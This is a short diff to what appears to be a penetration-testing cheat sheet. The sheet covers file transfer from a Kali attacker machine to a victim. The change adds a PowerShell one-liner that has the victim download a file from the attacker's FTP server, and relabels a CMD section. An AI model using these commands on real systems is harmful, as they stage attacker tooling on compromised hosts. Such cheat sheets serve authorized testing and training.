@@ -104,7 +104,14 @@
     Vict> echo "open 127.0.0.1 21\nuser anonymous anonymous\nbin\ncd <PATH>\nget <FILE>\nbye" | ftp -inv
     ```
 
-    > **FTP**: From Kali to Victim (Windows)
+    > **FTP**: From Kali to Victim (Windows - PowerShell)
+
+    ```pwsh
+    KALI$ pyftp
+    Vict> (New-Object Net.WebClient).DownloadFile('ftp://anonymous:anonymous@<KALI>:<KPORT>/<PATH>/<FILE>','<FILE>')
+    ```
+
+    > **FTP**: From Kali to Victim (Windows - CMD)
 
     ```pwsh
     KALI$ pyftp
